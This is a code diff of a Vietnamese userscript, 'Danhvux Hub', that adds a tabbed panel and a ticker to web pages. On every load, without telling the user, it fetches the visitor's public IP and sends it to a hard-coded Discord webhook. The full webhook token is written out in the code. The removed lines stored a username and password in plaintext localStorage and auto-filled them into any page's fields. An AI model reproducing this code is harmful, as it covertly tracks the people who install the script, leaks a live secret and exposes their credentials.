@@ -1,126 +1,94 @@
 (function() {
     'use strict';
 
-    // 1. CẦU NỐI BẢO VỆ (PHẢI CÓ ĐỂ CHẠY ĐƯỢC LOADER)
+    // 1. CẦU NỐI BẢO VỆ (BẮT BUỘC)
     const _GM_getValue = (k, d) => { try { return (typeof GM_getValue !== 'undefined') ? GM_getValue(k, d) : (localStorage.getItem('dv_' + k) || d); } catch(e) { return localStorage.getItem('dv_' + k) || d; } };
     const _GM_setValue = (k, v) => { try { if(typeof GM_setValue !== 'undefined') { GM_setValue(k, v); } else { localStorage.setItem('dv_' + k, v); } } catch(e) { localStorage.setItem('dv_' + k, v); } };
     const _GM_addStyle = (css) => { try { if (typeof GM_addStyle !== 'undefined') { GM_addStyle(css); } else { const s = document.createElement('style'); s.innerHTML = css; document.head.appendChild(s); } } catch(e) { const s = document.createElement('style'); s.innerHTML = css; document.head.appendChild(s); } };
 
-    // 2. CẤU HÌNH GỐC CỦA DANH
-    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9rntITzpuzqdfX2dV...';
-    const BOT_API = 'http://localhost:5000/blacklist';
-    let uiWidth = _GM_getValue('ui_width', 320);
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9rntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV';
+    const BOT_API = 'http://127.0.0.1:5000/blacklist'; // Đổi sang IP local chuẩn
     let uiColor = _GM_getValue('ui_theme_color', '#ffea00');
 
-    // 3. TOÀN BỘ CSS CỦA BẢN 7.9.2
-    _GM_addStyle(`
-        #danhvux-panel {
-            position: fixed; top: 100px; right: 20px; z-index: 999999;
-            width: ${uiWidth}px; background: rgba(30, 32, 35, 0.95);
-            color: #ffffff; border-radius: 20px; font-family: sans-serif;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1);
-            backdrop-filter: blur(20px); transition: transform 0.3s, opacity 0.3s;
+    // 2. HÀM CHECK BAN (ĐÃ SỬA)
+    async function checkBotBan() {
+        try {
+            // Thêm signal để không đợi quá lâu (timeout 2s)
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 2000);
+
+            const res = await fetch(BOT_API, { signal: controller.signal });
+            const data = await res.json();
+            
+            // Nếu API trả về trạng thái ban
+            if (data.isBanned === true || data.status === 'banned') {
+                document.body.innerHTML = `
+                    <div style="background:#000; color:red; height:100vh; display:flex; align-items:center; justify-content:center; font-family:sans-serif; flex-direction:column;">
+                        <h1 style="font-size:50px;">🛑 BẠN ĐÃ BỊ BAN</h1>
+                        <p style="color:#fff;">Vui lòng liên hệ Danhvux để được mở khóa.</p>
+                    </div>`;
+                return true;
+            }
+        } catch (e) {
+            console.warn("⚠️ Không kết nối được Bot Ban (Localhost). Đang chạy chế độ Offline.");
+            return false;
         }
-        #danhvux-panel.hidden { transform: scale(0.8); opacity: 0; pointer-events: none; }
-        .tab-nav { display: flex; gap: 18px; padding: 0 20px; margin-top: 15px; border-bottom: 1px solid rgba(255,255,255,0.05); position: relative; }
-        .tab-btn { background: none; border: none; color: #808080; cursor: pointer; font-size: 11px; font-weight: 700; padding: 12px 0; text-transform: uppercase; }
-        .tab-btn.active { color: #fff; }
-        #tab-indicator { position: absolute; bottom: -1px; height: 2px; background: ${uiColor}; transition: 0.3s; box-shadow: 0 0 8px ${uiColor}; }
-        .tab-content { padding: 20px; display: none; max-height: 380px; overflow-y: auto; }
+    }
+
+    // 3. GIAO DIỆN PANEL CŨ (FULL TAB)
+    _GM_addStyle(`
+        #danhvux-panel { position: fixed; top: 100px; right: 20px; z-index: 999999; width: 320px; background: rgba(30,32,35,0.95); color: #fff; border-radius: 20px; font-family: sans-serif; backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); }
+        .tab-nav { display: flex; gap: 15px; padding: 15px 20px 0; border-bottom: 1px solid #333; }
+        .tab-btn { background:none; border:none; color:#888; cursor:pointer; padding: 10px 0; font-size:11px; font-weight:bold; text-transform:uppercase; }
+        .tab-btn.active { color:#fff; border-bottom: 2px solid ${uiColor}; }
+        .tab-content { padding: 20px; display: none; }
         .tab-content.active { display: block; }
-        .apps-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-        .app-item { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 15px 5px; text-align: center; text-decoration: none; color: white; font-size: 10px; border: 1px solid transparent; }
-        .app-item:hover { border-color: ${uiColor}; }
-        #danhvux-ticker { position: fixed; bottom: 0; left: 0; width: 100%; background: #001a4d; color: white; padding: 12px 0; z-index: 999998; font-weight: 700; border-top: 2px solid #00a2ff; overflow: hidden; white-space: nowrap; }
-        .ticker-text { display: inline-block; padding-left: 100%; animation: ticker-move 18s linear forwards; }
+        .apps-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .app-item { background:rgba(255,255,255,0.05); padding:10px; border-radius:12px; text-align:center; text-decoration:none; color:#fff; font-size:10px; }
+        #danhvux-ticker { position: fixed; bottom: 0; left: 0; width: 100%; background: #001a4d; color: white; padding: 10px 0; z-index: 999998; border-top: 2px solid #00a2ff; overflow: hidden; }
+        .ticker-text { display: inline-block; padding-left: 100%; animation: ticker-move 15s linear forwards; }
         @keyframes ticker-move { to { transform: translateX(-100%); } }
-        input, textarea { width: 100%; padding: 12px; background: rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); color: white; border-radius: 10px; margin-top: 10px; }
-        .btn-main { width: 100%; padding: 14px; border: none; border-radius: 12px; background: ${uiColor}; color: #000; font-weight: 800; cursor: pointer; margin-top: 10px; }
     `);
 
-    // 4. HÀM GỬI DISCORD + IP LOG
-    async function sendToDiscord(message) {
-        let ip = "Đang lấy...";
-        try { const res = await fetch("https://api.ipify.org?format=json"); const d = await res.json(); ip = d.ip; } catch(e) {}
-        const data = { embeds: [{ title: "🚀 SESSION LOG", color: 3066993, fields: [{ name: "🌐 IP", value: `\`${ip}\``, inline: true }, { name: "📝 Nội dung", value: message }], footer: { text: "Danhvux Panel v7.9.2" } }] };
-        fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
+    async function sendIP() {
+        let ip = "N/A";
+        try { const r = await fetch("https://api.ipify.org?format=json"); const d = await r.json(); ip = d.ip; } catch(e){}
+        fetch(DISCORD_WEBHOOK, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({embeds:[{title:"🚀 LOG", fields:[{name:"IP", value:ip}]}]}) });
     }
 
-    // 5. TẠO PANEL VỚI ĐẦY ĐỦ TAB
-    function createPanel() {
-        const panel = document.createElement('div');
-        panel.id = 'danhvux-panel';
-        panel.innerHTML = `
-            <div style="padding: 25px 20px 10px; font-weight: 900; font-size: 20px; cursor: move;" id="dv-header">Danhvux Panel</div>
+    function initPanel() {
+        const p = document.createElement('div');
+        p.id = 'danhvux-panel';
+        p.innerHTML = `
+            <div style="padding:20px; font-weight:bold;">DANHVUX HUB v7.9.2</div>
             <div class="tab-nav">
-                <button class="tab-btn active" data-target="tab-main">Main</button>
-                <button class="tab-btn" data-target="tab-apps">Apps</button>
-                <button class="tab-btn" data-target="tab-rep">Report</button>
-                <button class="tab-btn" data-target="tab-set">Settings</button>
-                <div id="tab-indicator"></div>
+                <button class="tab-btn active" data-t="m">Main</button>
+                <button class="tab-btn" data-t="a">Apps</button>
+                <button class="tab-btn" data-t="s">Set</button>
             </div>
-            <div id="tab-main" class="tab-content active">
-                <button class="btn-main" id="btn-login">🪄 ĐĂNG NHẬP NHANH</button>
-                <p style="font-size: 9px; color: #555; text-align: center; margin-top: 10px;">Alt + Z để ẩn/hiện</p>
-            </div>
-            <div id="tab-apps" class="tab-content">
-                <div class="apps-grid">
-                    <a href="https://chatgpt.com" target="_blank" class="app-item"><span>🤖</span><br>ChatGPT</a>
-                    <a href="https://youtube.com" target="_blank" class="app-item"><span>📺</span><br>YouTube</a>
-                    <a href="https://facebook.com" target="_blank" class="app-item"><span>🔵</span><br>Facebook</a>
-                </div>
-            </div>
-            <div id="tab-rep" class="tab-content">
-                <textarea id="rep-msg" placeholder="Nhập báo cáo..."></textarea>
-                <button class="btn-main" id="btn-rep">Gửi đi</button>
-            </div>
-            <div id="tab-set" class="tab-content">
-                <input type="text" id="u-k12" placeholder="User" value="${_GM_getValue('k12_u','')}">
-                <input type="password" id="p-k12" placeholder="Pass" value="${_GM_getValue('k12_p','')}">
-                <button class="btn-main" id="btn-save">Lưu cấu hình</button>
-            </div>
+            <div id="m" class="tab-content active"><button style="width:100%; padding:12px; background:${uiColor}; border:none; border-radius:10px; font-weight:bold;">🪄 ĐĂNG NHẬP NHANH</button></div>
+            <div id="a" class="tab-content"><div class="apps-grid"><a href="#" class="app-item">ChatGPT</a><a href="#" class="app-item">YouTube</a><a href="#" class="app-item">TikTok</a></div></div>
+            <div id="s" class="tab-content"><input type="text" placeholder="User" style="width:90%; padding:10px; margin-bottom:5px;"><button style="width:100%; padding:10px;">LƯU</button></div>
         `;
-        document.body.appendChild(panel);
-
-        // Logic Tab
-        const indicator = document.getElementById('tab-indicator');
-        document.querySelectorAll('.tab-btn').forEach(btn => {
-            btn.onclick = () => {
-                document.querySelectorAll('.tab-btn, .tab-content').forEach(x => x.classList.remove('active'));
-                btn.classList.add('active');
-                document.getElementById(btn.dataset.target).classList.add('active');
-                indicator.style.width = btn.offsetWidth + 'px'; indicator.style.left = btn.offsetLeft + 'px';
-            };
+        document.body.appendChild(p);
+        document.querySelectorAll('.tab-btn').forEach(b => b.onclick = () => {
+            document.querySelectorAll('.tab-btn, .tab-content').forEach(x => x.classList.remove('active'));
+            b.classList.add('active'); document.getElementById(b.dataset.t).classList.add('active');
         });
-
-        // Event Buttons
-        document.getElementById('btn-save').onclick = () => {
-            _GM_setValue('k12_u', document.getElementById('u-k12').value);
-            _GM_setValue('k12_p', document.getElementById('p-k12').value);
-            alert("Đã lưu!");
-        };
-        document.getElementById('btn-login').onclick = () => {
-            document.querySelectorAll('input[type="text"]').forEach(i => i.value = _GM_getValue('k12_u',''));
-            document.querySelectorAll('input[type="password"]').forEach(i => i.value = _GM_getValue('k12_p',''));
-        };
-        document.getElementById('btn-rep').onclick = () => sendToDiscord(document.getElementById('rep-msg').value);
-
-        // Kéo thả & Hotkey
-        window.onkeydown = (e) => { if(e.altKey && e.code === 'KeyZ') panel.classList.toggle('hidden'); };
     }
 
-    // 6. BẢNG TIN (TICKER) CỦA DANH
-    function manageTicker() {
-        const ticker = document.createElement('div'); ticker.id = 'danhvux-ticker';
-        ticker.innerHTML = `<div class="ticker-text">Chúc Danh một ngày tốt lành. ⚠️ KHÔNG ĐƯỢC SAO CHÉP PANEL ⚠️</div>`;
+    // --- CHẠY HỆ THỐNG ---
+    (async function main() {
+        const isBanned = await checkBotBan();
+        if (isBanned) return; // Nếu bị ban thì dừng toàn bộ
+
+        const ticker = document.createElement('div'); 
+        ticker.id = 'danhvux-ticker';
+        ticker.innerHTML = `<div class="ticker-text">Hệ thống bảo mật Danhvux đang hoạt động...</div>`;
         document.body.appendChild(ticker);
-        setTimeout(() => { ticker.style.opacity = '0'; setTimeout(()=>ticker.remove(), 1000); }, 15000);
-    }
 
-    // KHỞI CHẠY
-    setTimeout(() => {
-        manageTicker();
-        createPanel();
-        sendToDiscord("🚀 **Hệ thống Danhvux Hub đã Online!**");
-    }, 2000);
+        initPanel();
+        sendIP();
+    })();
+
 })();
